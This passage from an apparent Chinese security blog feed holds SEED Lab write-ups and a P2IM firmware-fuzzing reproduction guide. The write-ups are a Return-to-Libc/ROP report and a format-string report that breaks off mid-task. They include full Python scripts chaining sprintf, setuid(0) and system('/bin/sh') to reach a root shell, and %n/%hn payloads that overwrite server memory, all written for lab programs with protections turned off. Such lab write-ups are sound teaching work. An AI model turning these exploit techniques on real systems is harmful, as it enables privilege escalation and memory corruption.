class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(baz_skip_addr)</span><br><span class="line">  content += tobytes(<span class="number">0xAABBCCDD</span>)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>-<span class="number">3</span>*<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>) <span class="comment"># The value is not important.</span></span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line">content += tobytes(<span class="number">0xEEBBCCDD</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功执行baz函数</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/ROP_2_results.png" alt="ROP_2_results"></p>
</li>
<li><p>ROP攻击实验二（串接libc函数）</p>
<p>思路：通过跳过前序对ebp的操作来串接多个需要参数的libc函数。</p>
<p>构造脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0xf7e20de0</span>    <span class="comment"># The address of printf()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">leaveret = <span class="number">0x565562ce</span></span><br><span class="line">bash_addr = <span class="number">0xffffd3dc</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo + <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)  <span class="comment"># Next ebp value</span></span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">4</span>)  <span class="comment"># Fill up the frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(printf_addr)</span><br><span class="line">  content += tobytes(leaveret)</span><br><span class="line">  content += tobytes(bash_addr)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果成功打印出MYSHELL环境变量值</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/ROP_3_results.png" alt="ROP_3_results"></p>
</li>
<li><p>ROP攻击实验三（参数存在0）</p>
<p>可以通过调用sprintf函数传递setuid的参数0，然后使用setuid(0)时real user ID &#x3D; effective user ID &#x3D; 0，从而使得bash&#x2F;dash在判断real user ID和effecive user ID时发现两者一致，从而使保护失效。然后调用system(‘&#x2F;bin&#x2F;sh’)获取root权限的shell，最终调用exit函数防止程序无法正常退出。</p>
<p>构造python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">value</span>):</span><br><span class="line">  <span class="keyword">return</span> (value).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0xf7e20de0</span>    <span class="comment"># The address of printf()</span></span><br><span class="line">exit_addr = <span class="number">0xf7e04f80</span>  <span class="comment"># The address of exit()</span></span><br><span class="line">leaveret = <span class="number">0x565562ce</span></span><br><span class="line">bash_addr = <span class="number">0xffffd3de</span></span><br><span class="line">ebp_foo = <span class="number">0xffffc968</span></span><br><span class="line">sprintf_addr = <span class="number">0xf7e20e40</span></span><br><span class="line">setuid_addr = <span class="number">0xf7e99e30</span></span><br><span class="line">system_addr = <span class="number">0xf7e12420</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate the address of setuid()&#x27;s 1st argument</span></span><br><span class="line">sprintf_arg1 = ebp_foo + <span class="number">12</span> + <span class="number">5</span>*<span class="number">0x20</span></span><br><span class="line"><span class="comment"># The address of a byte that contains 0x00</span></span><br><span class="line">sprintf_arg2 = bash_addr + <span class="built_in">len</span>(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with non-zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">112</span>))</span><br><span class="line"></span><br><span class="line">ebp_next = ebp_foo + <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)  <span class="comment"># Next ebp value</span></span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">2</span>*<span class="number">4</span>)  <span class="comment"># Fill up the frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sprintf(sprintf_arg1, sprintf_arg2)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  ebp_next += <span class="number">0x20</span></span><br><span class="line">  content += tobytes(ebp_next)</span><br><span class="line">  content += tobytes(sprintf_addr)</span><br><span class="line">  content += tobytes(leaveret)</span><br><span class="line">  content += tobytes(sprintf_arg1)</span><br><span class="line">  content += tobytes(sprintf_arg2)</span><br><span class="line">  content += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>-<span class="number">5</span>*<span class="number">4</span>)</span><br><span class="line">  sprintf_arg1 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setuid(0)</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(setuid_addr)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>-<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/bash&quot;)</span></span><br><span class="line">ebp_next += <span class="number">0x20</span></span><br><span class="line">content += tobytes(ebp_next)</span><br><span class="line">content += tobytes(system_addr)</span><br><span class="line">content += tobytes(leaveret)</span><br><span class="line">content += tobytes(bash_addr)</span><br><span class="line">content += <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0x20</span> - <span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit()</span></span><br><span class="line">content += tobytes(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">content += tobytes(exit_addr)  <span class="comment"># Return address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Save content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>结果如下，成功获取到root权限下的shell</p>
<p><img src="/img/posts/2023-11-20-Return_to_Libc%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/images/ROP_4_results.png" alt="ROP_4_results"></p>
</li>
</ol>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>Return to Libc</tag>
        <tag>SEED Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>P2IM复现</title>
    <url>/posts/5786d6f8.html</url>
    <content><![CDATA[<h1 id="P2IM论文复现"><a href="#P2IM论文复现" class="headerlink" title="P2IM论文复现"></a>P2IM论文复现</h1><p>导师说要多实践，因此将看过的P2IM论文进行复现，同时对源码进行简单查看。</p>
<p>看网上并没有相关的复现教程，因此写下该博客</p>
<p>链接: <a href="https://github.com/RiS3-Lab/p2im">https://github.com/RiS3-Lab/p2im</a></p>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h2><p>Ubuntu 16.04 !!!（重中之重！其他版本可能不成功）</p>
<p>GNU Arm Embedded Toolchain：<a href="https://developer.arm.com/downloads/-/gnu-rm">https://developer.arm.com/downloads/-/gnu-rm</a></p>
<p>fuzz target: <a href="https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary">https://github.com/RiS3-Lab/p2im-real_firmware/tree/d4c7456574ce2c2ed038e6f14fea8e3142b3c1f7/binary</a></p>
<h2 id="2-过程"><a href="#2-过程" class="headerlink" title="2. 过程"></a>2. 过程</h2><ol>
<li><p>首先下载p2im源码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RiS3-Lab/p2im.git</span><br><span class="line"><span class="built_in">cd</span> p2im</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载子项目</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># submodules are cloned into externals/</span></span><br><span class="line">git submodule update --init</span><br><span class="line">git submodule update --remote</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载并解压GNU Arm Embedded Toolchain，并且将其内&#x2F;bin目录添加到环境变量</p>
</li>
<li><p>编译AFL，ubuntu16.04测试没有问题，ubuntu22.04不行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compile AFL</span></span><br><span class="line">make -C afl/</span><br></pre></td></tr></table></figure>
</li>
<li><p>Qemu已经在项目里预编译好了，不需要额外配置</p>
</li>
</ol>
<h2 id="3-Fuzzing"><a href="#3-Fuzzing" class="headerlink" title="3. Fuzzing"></a>3. Fuzzing</h2><ol>
<li><p>确定工作区</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">WORKING_DIR=&lt;repo_path&gt;/fuzzing/&lt;firmware_name&gt;/&lt;fuzzing_run_num&gt;/</span><br><span class="line">mkdir -p $&#123;WORKING_DIR&#125;</span><br><span class="line">cd $&#123;WORKING_DIR&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将输入seed文件复制到工作区&#x2F;inputs文件夹下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the <span class="string">&quot;random&quot;</span> seed to the working directory</span></span><br><span class="line">cp -r &lt;repo_path&gt;/fuzzing/templates/seeds/ $&#123;WORKING_DIR&#125;/inputs</span><br></pre></td></tr></table></figure>
</li>
<li><p>将配置文件fuzz.cfg.template文件复制到工作区下，注意：文件名和内容需要根据修改！要把文件内&lt;&gt;的内容改为实际绝对地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copy the template to the working directory</span></span><br><span class="line">cp &lt;repo_path&gt;/fuzzing/templates/fuzz.cfg.template fuzz.cfg</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始fuzz</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;repo_path&gt;/model_instantiation/fuzz.py -c fuzz.cfg</span><br></pre></td></tr></table></figure>

<p>难绷，还是报错。。。不知道是哪儿的问题。。。</p>
<p><img src="/img/posts/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218185021864.png" alt="image-20231218185021864"></p>
</li>
</ol>
<p>又试了几次，其中把报错上面的命令又跑了跑，再运行发现就可以了。。。</p>
<p><img src="/img/posts/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218190107050.png" alt="image-20231218190107050"></p>
<p><img src="/img/posts/2023-12-18-P2IM%E5%A4%8D%E7%8E%B0.assets/image-20231218190125898.png" alt="image-20231218190125898"></p>
]]></content>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串实验报告</title>
    <url>/posts/5a0832a9.html</url>
    <content><![CDATA[<h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1 Overview"></a>1 Overview</h2><p><code>printf</code>函数用于根据指定格式打印出字符串，第一个参数诶格式化字符串<code>format string</code>，格式化字符串中使用了<code>%</code>来作为占位符。如果不使用<code>%</code>占位符而是直接将变量放入格式化字符串，则存在格式化字符串漏洞，可能被恶意利用。</p>
<h2 id="2-Environment-Setup"><a href="#2-Environment-Setup" class="headerlink" title="2 Environment Setup"></a>2 Environment Setup</h2><h3 id="2-1-Turning-of-Countermeasure"><a href="#2-1-Turning-of-Countermeasure" class="headerlink" title="2.1 Turning of Countermeasure"></a>2.1 Turning of Countermeasure</h3><p>关闭ASLR</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">kernel.randomize_va_space = 0</span><br></pre></td></tr></table></figure>

<h3 id="2-2-The-Vulnerable-Program"><a href="#2-2-The-Vulnerable-Program" class="headerlink" title="2.2 The Vulnerable Program"></a>2.2 The Vulnerable Program</h3><p>漏洞程序如下</p>
<p><code>format.c</code>：<code>myprintf</code>存在漏洞<code>printf(msg)</code>;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the rbp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq %%rbp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the ebp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(msg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Compilation</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cd server-code</span><br><span class="line">❯ make</span><br><span class="line">gcc -o server server.c</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -static -m32 -o format-32 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -o format-64 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">❯ make install</span><br><span class="line">cp server ../fmt-containers</span><br><span class="line">cp format-* ../fmt-containers</span><br></pre></td></tr></table></figure>

<p>可以看到编译中gcc会警告存在格式化字符串漏洞</p>
<h3 id="2-3-Container-Setup-and-Commands"><a href="#2-3-Container-Setup-and-Commands" class="headerlink" title="2.3 Container Setup and Commands"></a>2.3 Container Setup and Commands</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dcbuild</span><br><span class="line">dcup</span><br></pre></td></tr></table></figure>

<h2 id="3-Task-1-Crashing-the-Program"><a href="#3-Task-1-Crashing-the-Program" class="headerlink" title="3 Task 1: Crashing the Program"></a>3 Task 1: Crashing the Program</h2><p>首先尝试向10.9.0.5发送hello消息</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211150919446.png" alt="image-20231211150919446"></p>
<p>server端结果</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211150812716.png" alt="image-20231211150812716"></p>
<p>服务器最多接受1500字节的数据，在此任务中，需要构造payload让程序崩溃（服务器不会崩溃，因为format程序是server的子进程）</p>
<p>构造payload：<code>%s</code>，发现服务器端没有输出，程序成功crash</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211151346427.png" alt="image-20231211151346427"></p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211151405655.png" alt="image-20231211151405655"></p>
<h2 id="4-Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#4-Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="4 Task 2: Printing Out the Server Program’s Memory"></a>4 Task 2: Printing Out the Server Program’s Memory</h2><p>继续使用10.9.0.5，令服务器打印出内存中数据</p>
<h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h3><p>打印栈上数据，需要知道需要多少个<code>%.8x</code>占位符，才能使服务器程序打印出输入的前四个字节。</p>
<p>构造python脚本，设定前四个字节为<code>0xffffffff</code>，构造100个<code>%.8x.</code>，令服务器端打印100个地址，查看前四个字节的位置。</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211152629169.png" alt="image-20231211152629169"></p>
<p>可以看到，<code>0xffffffff</code>位于第64个<code>%.8x.</code>处。</p>
<h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h3><p>堆上存储着一个秘密值，可以通过服务器端输出查找到，目标为打印出secret秘密值</p>
<p>由服务器端输出可以知道secret的地址为<code>0x080b4008</code>，因此将buffer的前四个字节设置为secret的地址，通过<code>%s</code>令服务器输出该地址的值。</p>
<p>构造python脚本如下:</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211153657826.png" alt="image-20231211153657826"></p>
<p>结果如上图，成功输出<code>A secret message</code>字符串</p>
<h2 id="5-Task-3-Modifying-the-Server-Program’s-Memory"><a href="#5-Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="5 Task 3: Modifying the Server Program’s Memory"></a>5 Task 3: Modifying the Server Program’s Memory</h2><p>继续使用10.9.0.5，目标为修改0x11223344地址的值。</p>
<h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><p>更改值即可，由服务器端输出可知<code>target</code>地址为<code>0x080e5068</code>，可以通过<code>%n</code>修改地址的值，构造payload。</p>
<p>payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">63</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出如下图，可见<code>target</code>成功被修改为了前面输出字符的个数(4+4+63*9)&#x3D;575&#x3D;0x23f</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211154137419.png" alt="image-20231211154137419"></p>
<h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h3><p>0x5000-0x23f &#x3D;  19905 因此需要增加19905个字符。</p>
<p>构造<code>payload</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.19914x&quot;</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>

<p>成功修改值为0x5000</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211160234002.png" alt="image-20231211160234002"></p>
<h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><p>值比较大，因此如果使用<code>%n</code>会导致输出时间过长，甚至可能卡死，因此需要使用<code>%hn</code>或<code>%hhn</code>一次只修改两个或一个字节。</p>
<p>如果使用<code>%hn</code>构造payload，一次只修改两字节，则需要先修改值较小的地址，然后才能修改值较高的地址。</p>
<p>构造前八个字节分别对应<code>0xAABB</code>和<code>0xCCDD</code>的地址，并且构造payload对两个地址的值分别进行修改：<code>0xaabb - 0x23f + 9 - 4 = 43137</code>， <code>0xccdd - 0xaabb = 8738</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line">number  = <span class="number">0x080e5068</span> <span class="comment"># target地址（小端法，读两个字节就是0x5068）</span></span><br><span class="line">number_1 = number + <span class="number">2</span>   <span class="comment"># target前2个字节地址</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number_1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.43137x&quot;</span> + <span class="string">&quot;%hn&quot;</span> +<span class="string">&quot;%.8738x&quot;</span>  +<span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功修改成目标值</p>
<p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211164056253.png" alt="image-20231211164056253"></p>
<h2 id="6-Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#6-Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="6 Task 4: Inject Malicious Code into the Server Program"></a>6 Task 4: Inject Malicious Code into the Server Program</h2><h3 id="6-1-Understanding-the-Stack-Layout"><a href="#6-1-Understanding-the-Stack-Layout" class="headerlink" title="6.1 Understanding the Stack Layout"></a>6.1 Understanding the Stack Layout</h3><p><img src="/img/posts/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211164407343.png" alt="image-20231211164407343"></p>
<p><strong>Question 1: What are the memory addresses at the locations marked by 2 and 3?</strong></p>
<p>  ②是函数<code>myprintf</code>的返回地址，地址应为<code>frame pointer+4 = 0xffffcfac</code>③是<code>buf</code>的起始地址，可以从服务器输出直接获得：<code>0xffffd080</code></p>
<p><strong>Question 2: How many %x format specifiers do we need to move the format string argument pointerto 3? Remember, the argument pointer starts from the location above 1.</strong></p>
<p>由上文可知，buf的前四字节需要64个%x才可以达到。</p>
<h3 id="6-3-Your-Task"><a href="#6-3-Your-Task" class="headerlink" title="6.3 Your Task"></a>6.3 Your Task</h3><p>获取server的shell。</p>
<p>需要修改函数<code>myprintf</code>的返回地址为<code>shellcode</code>地址，将<code>shellcode</code>放在buf末尾，然后使用上文的方法将shellcode地址写入返回地址即可：</p>
